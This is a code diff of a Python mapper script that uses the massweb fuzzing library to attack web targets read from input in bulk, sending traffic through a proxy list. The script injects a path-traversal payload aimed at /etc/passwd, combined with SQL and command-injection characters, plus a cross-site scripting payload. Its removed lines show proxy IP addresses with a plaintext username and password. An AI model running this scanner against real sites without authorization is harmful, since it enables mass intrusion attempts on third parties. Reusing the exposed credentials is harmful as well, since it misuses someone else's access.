@@ -6,12 +6,9 @@ from massweb.fuzzers.get_fuzzer import GetFuzzer
 
 def get_proxy_list():
 
-    proxies_raw = """50.118.140.240:29842:acaceres:DgXQdVjG
-    50.118.141.138:29842:acaceres:DgXQdVjG
-    50.118.141.82:29842:acaceres:DgXQdVjG
-    8.30.147.110:29842:acaceres:DgXQdVjG
-    8.30.147.159:29842:acaceres:DgXQdVjG
-    8.30.147.35:29842:acaceres:DgXQdVjG"""
+    proxies_raw = """
+    ip:username:password
+"""
 
     proxies_list = []
     for x in proxies_raw.split("\n"):
@@ -27,21 +24,7 @@ def get_proxy_list():
 
     return proxies_list
 
-def mapper():
-
-    proxy_list = get_proxy_list()
-    gf = GetFuzzer(num_threads = 10, proxy_list = proxy_list)
-    gf.add_payload_from_string("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\", check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
-    gf.add_payload_from_string('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])
-
-    for line in sys.stdin:
-
-        try:
-            line = line.strip()
-            gf.add_target_from_url(line)
-
-        except:
-            sys.stderr.write("Failed to add line to targets!\n")
+def fuzz_and_print_results(gf):
 
     for r in gf.fuzz():
 
@@ -50,6 +33,43 @@ def mapper():
                 print urlparse(r.fuzzy_target.url).netloc + "\t" + str(r)
         except:
             sys.stderr.write("Failed to fuzz a target!\n")
+
+def create_fuzzer():
+
+    sys.stderr.write("Creating new fuzzer")
+    proxy_list = get_proxy_list()
+    gfc = GetFuzzer(num_threads = 10, proxy_list = proxy_list)
+    gfc.add_payload_from_string("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\", check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
+    gfc.add_payload_from_string('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])
+    return gfc
+
+def mapper():
+
+    simul_fuzz = 500
+    c = 0
+    gf = create_fuzzer()
+
+    for line in sys.stdin:
+
+        try:
+            line = line.strip()
+            sys.stderr.write("Adding target %s\n" % line)
+            gf.add_target_from_url(line)
+            c += 1
+
+        except:
+            sys.stderr.write("Failed to add line to targets!\n")
+
+        if c == simul_fuzz:
+            fuzz_and_print_results(gf)
+            del gf.targets
+            del gf.payloads
+            del gf
+            gf = create_fuzzer()
+            c = 0
+
+    if c > 0:
+        fuzz_and_print_results(gf)
 
 if __name__ == "__main__":
 
